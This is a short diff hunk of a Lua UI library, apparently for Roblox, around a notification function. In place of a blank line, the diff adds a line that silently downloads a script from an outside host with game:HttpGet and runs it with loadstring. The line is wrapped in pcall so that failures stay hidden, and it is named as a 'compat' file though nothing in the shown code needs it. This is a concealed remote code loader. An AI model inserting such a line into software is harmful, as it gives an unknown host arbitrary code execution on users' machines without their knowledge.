@@ -181,7 +181,7 @@ spawn(function()
 		roloxxUI:Destroy()	
 		end)
 end
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 function roUI:CreateCancelChoiceNotify(titlea, desca, iconz, canceltext, comfirmtext, timer, callback, nocallback)
 	callback = callback or function() end
 	timer = timer or 5
